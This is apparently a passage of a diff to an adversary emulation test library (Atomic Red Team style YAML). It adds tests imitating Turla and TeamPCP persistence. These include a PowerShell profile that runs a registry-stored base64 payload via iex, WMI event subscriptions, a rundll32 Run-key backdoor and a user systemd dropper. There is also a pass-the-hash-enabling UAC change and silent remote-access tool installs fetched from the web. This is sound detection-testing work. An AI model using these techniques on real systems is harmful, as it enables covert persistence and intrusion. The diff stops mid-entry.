   T1205.002:
     technique:
       type: attack-pattern
@@ -45259,6 +46421,83 @@ persistence:
           $oldprofile = cat $profile | Select-Object -skiplast 1
           Set-Content $profile -Value $oldprofile
         name: powershell
+    - name: Turla Malicious Powershell Profile for Persistence
+      auto_generated_guid: b5d7e195-4b66-428a-b6d5-04d671a13869
+      description: |
+        Creates a PowerShell profile that emulates Turla tradecraft observed in the wild. The profile checks
+        if it is running as SYSTEM (S-1-5-18) via WMI, logs execution to an XOR-obfuscated file disguised
+        as a thumbnail cache (C:\Users\Public\Downloads\thumbs.ini), reads a base64-encoded payload from
+        a registry key masquerading as an ActiveX compatibility entry, and executes it via Invoke-Expression.
+
+        Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      supported_platforms:
+      - windows
+      input_arguments:
+        profile_path:
+          description: Path to the PowerShell profile to create
+          type: path
+          default: "$profile"
+        benign_payload:
+          description: Benign PowerShell command to base64-encode and store in the
+            registry as the payload
+          type: string
+          default: Get-Date
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Back up the PowerShell profile if it exists
+        prereq_command: 'if ((Test-Path "$env:TEMP\T1546.013_profile_backup") -or
+          !(Test-Path "#{profile_path}")) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Copy-Item "#{profile_path}" "$env:TEMP\T1546.013_profile_backup"
+          -Force
+
+          '
+      - description: Back up the modified registry key if it exists
+        prereq_command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          if ((Test-Path "$env:TEMP\T1546013_activex_backup.reg") -or !(Test-Path $regPath)) { exit 0 } else { exit 1 }
+        get_prereq_command: 'reg export "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX
+          Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}" "$env:TEMP\T1546013_activex_backup.reg"
+          /y
+
+          '
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+          $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('#{benign_payload}'))
+          Set-Item -Path $regPath -Value $encodedPayload
+          $profileContent = @'
+          try
+          {
+              $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} | % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
+              if ("$SystemProc" -ne "")
+              {
+                $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}').'(Default)')) | iex
+              }
+          }
+          catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_ </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
+          '@
+          New-Item -ItemType Directory -Path (Split-Path "#{profile_path}") -Force
+          Set-Content "#{profile_path}" -Value $profileContent -Force
+          Start-Process powershell.exe -ArgumentList "-Command", "Start-Sleep -Seconds 30" -Wait
+        cleanup_command: |
+          if (Test-Path "$env:TEMP\T1546.013_profile_backup") {
+            Move-Item "$env:TEMP\T1546.013_profile_backup" "#{profile_path}" -Force
+          } else {
+            Remove-Item "#{profile_path}" -Force -ErrorAction SilentlyContinue
+          }
+          $regPath = "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path "$env:TEMP\T1546013_activex_backup.reg") {
+            reg import "$env:TEMP\T1546013_activex_backup.reg" 2>&1 | Out-Null
+            Remove-Item "$env:TEMP\T1546013_activex_backup.reg" -Force
+          }
+          Remove-Item "C:\Users\Public\Downloads\thumbs.ini" -Force -ErrorAction SilentlyContinue
   T1543:
     technique:
       type: attack-pattern
@@ -46393,7 +47632,7 @@ persistence:
         dllfilename:
           description: It specifies Dll file to run as service
           type: string
-          default: "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"
+          default: PathToAtomicsFolder\T1543.003\bin\W64Time.dll
       executor:
         command: |-
           copy "#{dllfilename}" %systemroot%\system32\
@@ -46402,13 +47641,17 @@ persistence:
           sc description W64Time "Maintain date and time synch on all clients and services in the network"
           reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
           reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Hosts /t REG_SZ /d "127.0.0.1" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Security /t REG_SZ /d "127.0.0.1" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeLong /t REG_DWORD /d 300000 /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeShort /t REG_DWORD /d 5000 /f
           sc start W64Time
         cleanup_command: |-
           sc stop W64Time
           sc.exe delete W64Time
           del %systemroot%\system32\w64time.dll
           reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
-          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
+          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /f
         name: command_prompt
         elevation_required: true
     - name: Remote Service Installation CMD
@@ -51048,6 +52291,94 @@ persistence:
           reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}" /t REG_SZ /d "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" /f
         name: command_prompt
         elevation_required: true
+    - name: Turla Mosquito - Store Backdoor Path in OneDriveUpdate Registry Key
+      auto_generated_guid: b6a03947-452c-4137-afaa-112b3c924fd6
+      description: |
+        Emulates the registry-storing behavior of Turla's Mosquito backdoor. Mosquito records its components in the registry key HKCU\Software\Microsoft\Windows\OneDriveUpdate
+        so its loader can reassemble the chain at runtime. It writes:
+
+          1. The name of the original (legitimately hijacked) DLL, tagged with the CLSID, into an
+             "explorer.exe" value under the OneDriveUpdate key.
+          2. The path to the main backdoor into the default value of the same OneDriveUpdate key.
+
+        Mosquito disguises its backdoor as an Adobe Acrobat support file (AdobeSysFnt09.pdb). This test
+        only writes the registry values referencing that IOC-matching file path and hijacked DLL name.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/05/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Back up any pre-existing OneDriveUpdate registry key so its
+          original values can be restored during cleanup.
+
+          '
+        prereq_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          if ((Test-Path $backupFile) -or (-not (Test-Path "HKCU:\Software\Microsoft\Windows\OneDriveUpdate"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          reg export "HKCU\Software\Microsoft\Windows\OneDriveUpdate" "$backupFile" /y | Out-Null
+      executor:
+        command: |
+          $updateKey = "HKCU:\Software\Microsoft\Windows\OneDriveUpdate"
+          New-Item -Path $updateKey -Force | Out-Null
+          Set-ItemProperty -Path $updateKey -Name 'explorer.exe' -Value '%SystemRoot%\system32\EhStorShell.dll;{d9144dcd-e998-4eca-ab6a-dcd83ccba16d};new'
+          Set-Item -Path $updateKey -Value '%APPDATA%\Adobe\Acrobat\9.0\AdobeSysFnt09.pdb'
+        cleanup_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          $regPath = "HKCU:\Software\Microsoft\Windows\OneDriveUpdate".Replace('HKCU:', 'HKCU')
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path $backupFile) {
+            reg import "$backupFile" 2>&1 | Out-Null
+            Remove-Item $backupFile -Force -ErrorAction Ignore
+          }
+        name: powershell
+        elevation_required: false
+    - name: Disable UAC remote restrictions via LocalAccountTokenFilterPolicy
+      auto_generated_guid: e8c7c404-b669-4cf9-bafd-fdad89a5bbb1
+      description: |
+        Sets the LocalAccountTokenFilterPolicy registry value to 1 under
+        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System. This disables UAC
+        remote restrictions (token filtering) so that local administrator accounts receive
+        a full (non-filtered) high-integrity token when authenticating over the network,
+        enabling remote administrative actions such as Pass-the-Hash and remote WMI/SMB
+        admin access.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Save current LocalAccountTokenFilterPolicy state for cleanup
+          restore.
+
+          '
+        prereq_command: 'if (Test-Path "$env:TEMP\T1112_LATP_backup.txt") { exit 0
+          } else { exit 1 }
+
+          '
+        get_prereq_command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          $prop = Get-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
+          if ($prop -eq $null) { "notpresent" | Out-File "$env:TEMP\T1112_LATP_backup.txt" } else { $prop.LocalAccountTokenFilterPolicy | Out-File "$env:TEMP\T1112_LATP_backup.txt" }
+      executor:
+        command: 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value 1 -Force
+
+          '
+        cleanup_command: |
+          $backupFile = "$env:TEMP\T1112_LATP_backup.txt"
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          if (Test-Path $backupFile) {
+            $orig = (Get-Content $backupFile).Trim()
+            if ($orig -eq "notpresent") {
+              Remove-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -Force -ErrorAction Ignore
+            } else {
+              Set-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value ([int]$orig) -Force
+            }
+            Remove-Item $backupFile -Force
+          }
+        name: powershell
+        elevation_required: true
   T1543.004:
     technique:
       type: attack-pattern
@@ -54324,6 +55655,49 @@ persistence:
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
         name: powershell
+    - name: Turla WMI Persistence - Dual Filter with Base64 Payload
+      auto_generated_guid: 67cee1c5-8c9b-460b-a4c3-76a6c69bcd15
+      description: |
+        Emulates WMI event subscription persistence used by Turla. Creates a single CommandLineEventConsumer
+        with a base64-encoded PowerShell payload, then binds it to two event filters: one that triggers at a
+        specific time of day (Win32_LocalTime) and one that triggers based on system uptime
+        (Win32_PerfFormattedData_PerfOS_System).
+
+        Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      supported_platforms:
+      - windows
+      input_arguments:
+        benign_payload:
+          description: Benign PowerShell command to base64-encode and use as the payload
+          type: string
+          default: Get-Date
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('#{benign_payload}'))
+          $cmdLine = "$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $encodedPayload"
+
+          Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
+          $consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate=$cmdLine;RunInteractively='false'}
+
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+          $timeQuery = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40"
+          $timeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$timeQuery}
+          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$timeFilter;Consumer=$consumer}
+
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+          $uptimeQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400"
+          $uptimeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$uptimeQuery}
+          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$uptimeFilter;Consumer=$consumer}
+        cleanup_command: |
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+          Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
   T1554:
     technique:
       type: attack-pattern
@@ -55092,6 +56466,59 @@ persistence:
           Modify" /f
         name: command_prompt
         elevation_required: true
+    - name: Turla Mosquito Run Key Persistence via rundll32 DLL Export
+      auto_generated_guid: 522c390e-8c86-497c-b37e-79a4eb072a89
+      description: |
+        Imitates the Registry Run key persistence used by Turla's Mosquito backdoor.
+
+        Upon successful execution, an `auto_update` value is written to the current user's Run key pointing to a
+        rundll32 invocation of the (benign, by default) DLL.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      input_arguments:
+        backdoor_dll:
+          description: Path to the DLL the Run key will invoke via rundll32 (stands
+            in for the Mosquito backdoor).
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll
+        backdoor_dll_url:
+          description: URL to download the stand-in DLL from if it is not present
+            on disk
+          type: url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The DLL that the Run key will point to must exist on disk at
+          #{backdoor_dll}
+
+          '
+        prereq_command: 'if (Test-Path "#{backdoor_dll}") { exit 0 } else { exit 1
+          }
+
+          '
+        get_prereq_command: |
+          New-Item -Type Directory (Split-Path "#{backdoor_dll}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest "#{backdoor_dll_url}" -OutFile "#{backdoor_dll}"
+          New-Item -ItemType File -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force | Out-Null
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "$env:TEMP\auto_update_runkey_backup.reg" /y
+          $runValue = "rundll32.exe `"#{backdoor_dll}`", StartRoutine"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Value $runValue -PropertyType String -Force | Out-Null
+        cleanup_command: |
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Force -ErrorAction SilentlyContinue
+          if (Test-Path "$env:TEMP\auto_update_runkey_backup.reg") {
+            reg import "$env:TEMP\auto_update_runkey_backup.reg"
+            Remove-Item -Path "$env:TEMP\auto_update_runkey_backup.reg" -Force
+          }
+          if (Test-Path "$env:TEMP\backdoor_dll_installed_by_atomic") {
+            Remove-Item -Path "#{backdoor_dll}" -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force
+          }
   T1136.003:
     technique:
       type: attack-pattern
@@ -58001,12 +59428,24 @@ persistence:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
       executor:
         command: |-
-          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
-          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}"
-          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          $clsidKey = 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          $inprocKey = "$clsidKey\InprocServer32"
+          $regPath = "HKCU\SOFTWARE\Classes\CLSID\#{clsid}"
+          $backupFile = "$env:TEMP\T1546.015_com_hijack_backup.reg"
+          Remove-Item $backupFile -Force -ErrorAction Ignore
+          if (Test-Path $clsidKey) { reg export "$regPath" "$backupFile" /y | Out-Null }
+          New-Item -Path $clsidKey -Value '#{clsid_description}' -Force | Out-Null
+          New-Item -Path $inprocKey -Value "#{dllpath}" -Force | Out-Null
+          New-ItemProperty -Path $inprocKey -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String" -Force | Out-Null
           Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
-        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
-          -Recurse -ErrorAction Ignore
+        cleanup_command: |-
+          $regPath = "HKCU\SOFTWARE\Classes\CLSID\#{clsid}"
+          $backupFile = "$env:TEMP\T1546.015_com_hijack_backup.reg"
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path $backupFile) {
+            reg import "$backupFile" 2>&1 | Out-Null
+            Remove-Item $backupFile -Force -ErrorAction Ignore
+          }
         name: powershell
     - name: Powershell Execute COM Object
       auto_generated_guid: 752191b1-7c71-445c-9dbe-21bb031b18eb
@@ -60220,6 +61659,68 @@ persistence:
           systemctl disable T1543.002
           rm -rf /etc/init.d/T1543.002
           systemctl daemon-reload
+    - name: TeamPCP Aqua Trivy Persistence
+      auto_generated_guid: a29738b0-0e14-488c-984f-6a851fcdbcfe
+      description: |
+        Simulates the persistence mechanism used by TeamPCP malware distributed via a hijacked
+        Aqua Trivy binary. Installs a user-level systemd service (sysmon) that drops a
+        Python script to ~/.config/systemd/user/sysmon.py. The script writes a second-stage
+        payload to #{pglog_path} and executes it in a new session. In the wild, the dropper polls
+        an ICP-hosted C2 canister for a download URL; this test creates the payload unconditionally
+        to avoid external network contact. Filepaths and names match observed IOCs.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      input_arguments:
+        pglog_path:
+          description: Path where the dropper writes and executes the second-stage
+            payload
+          type: path
+          default: "/tmp/pglog"
+        sysmon_script_path:
+          description: Path to the sysmon Python script copied into the user systemd
+            directory
+          type: path
+          default: "$PathToAtomicsFolder/T1543.002/src/sysmon.py"
+      dependencies:
+      - description: python3 must be installed
+        prereq_command: 'which python3 > /dev/null 2>&1
+
+          '
+        get_prereq_command: 'apt-get install -y python3 2>/dev/null || yum install
+          -y python3 2>/dev/null
+
+          '
+      dependency_executor_name: bash
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          mkdir -p $HOME/.config/systemd/user
+          cp "#{sysmon_script_path}" "$HOME/.config/systemd/user/sysmon.py"
+          echo "[Unit]" > $HOME/.config/systemd/user/sysmon.service
+          echo "Description=System Monitor Service" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Service]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Type=simple" >> $HOME/.config/systemd/user/sysmon.service
+          echo "ExecStart=/usr/bin/python3 $HOME/.config/systemd/user/sysmon.py \"#{pglog_path}\"" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Restart=always" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Install]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "WantedBy=default.target" >> $HOME/.config/systemd/user/sysmon.service
+          systemctl --user daemon-reload
+          systemctl --user enable sysmon.service
+          systemctl --user start sysmon.service
+          loginctl enable-linger $USER
+        cleanup_command: |
+          systemctl --user stop sysmon.service
+          systemctl --user disable sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.py
+          rm -f #{pglog_path}
+          systemctl --user daemon-reload
+          loginctl disable-linger $USER
   T1668:
     technique:
       type: attack-pattern
@@ -62939,16 +64440,43 @@ command-and-control:
         '
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'TeamViewer installer must exist on disk at the specified location
+          (#{installer_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{installer_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe
+        download_url:
+          description: url to download teamviewer from
+          type: url
+          default: https://download.teamviewer.com/download/TeamViewer_Setup_x64.exe
       executor:
-        command: "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe
-          https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 =
-          \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process
-          -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n"
+        command: |
+          Start-Process -Wait "#{installer_path}" /S;
+          Start-Process 'C:\Program Files\TeamViewer\TeamViewer.exe'
         cleanup_command: |-
-          $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
+          $file = 'C:\Program Files\TeamViewer\uninstall.exe'
           if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
-          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
-          Remove-Item $file1 -ErrorAction Ignore | Out-Null
+          Remove-Item "#{installer_path}" -ErrorAction Ignore | Out-Null
+
+          Get-ChildItem "C:\Users\*\AppData\Local" "TeamViewer" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+          $Directory = $_.ToString()
+          Remove-Item $Directory -Recurse -Force -ErrorAction SilentlyContinue
+          }
         name: powershell
         elevation_required: true
     - name: AnyDesk Files Detected Test on Windows
@@ -62960,14 +64488,37 @@ command-and-control:
         '
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'AnyDesk must exist on disk at the specified location (#{installer_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{installer_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"
+      input_arguments:
+        installer_path:
+          description: where the AnyDesk will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe
+        download_url:
+          description: url to download AnyDesk from
+          type: url
+          default: https://download.anydesk.com/AnyDesk.exe
       executor:
-        command: |
-          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
-          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
-          Start-Process $file1 /S;
+        command: 'Start-Process "#{installer_path}" /S;
+
+          '
         cleanup_command: |-
-          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
-          Remove-Item $file1 -ErrorAction Ignore
+          Stop-Process -Name "AnyDesk" -Force
+          Start-Sleep -Seconds 5
+          Remove-Item "#{installer_path}" -ErrorAction Ignore
         name: powershell
         elevation_required: true
     - name: LogMeIn Files Detected Test on Windows
@@ -62979,15 +64530,41 @@ command-and-control:
         '
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'LogMeIn installer must exist on disk at the specified location
+          (#{installer_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{installer_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\LogMeInIgnition.msi
+        download_url:
+          description: url to download LogMeIn from
+          type: url
+          default: https://secure.logmein.com/LogMeInIgnition.msi
       executor:
         command: |
-          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
-          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
-          Start-Process -Wait $file1 /quiet;
+          Start-Process -Wait "#{installer_path}" /quiet;
           Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
         cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
-          \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
-          $file1 -ErrorAction Ignore"
+          \nRemove-Item \"#{installer_path}\" -ErrorAction Ignore\nStop-Process -Name
+          \"msedge\" -Force -ErrorAction Ignore\n\nGet-ChildItem \"C:\\Users\\*\\AppData\\Local\"
+          \"LogMeIn\" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object
+          {\n$Directory = $_.ToString()\nRemove-Item $Directory -Recurse -Force -ErrorAction
+          SilentlyContinue\n}\nRemove-Item \"C:\\ProgramData\\LogMeIn\" -Recurse -Force
+          -ErrorAction SilentlyContinue"
         name: powershell
         elevation_required: true
     - name: GoToAssist Files Detected Test on Windows
@@ -62999,12 +64576,54 @@ command-and-control:
         '
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'GoToAssist must exist on disk at the specified location (#{installer_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{installer_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"
+      input_arguments:
+        installer_path:
+          description: where GoToAssist will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\GoToAssist.exe
+        download_url:
+          description: url to download GoToAssist from
+          type: url
+          default: https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw"&"downloadTrigger=restart"&"renameFile=1
       executor:
-        command: |
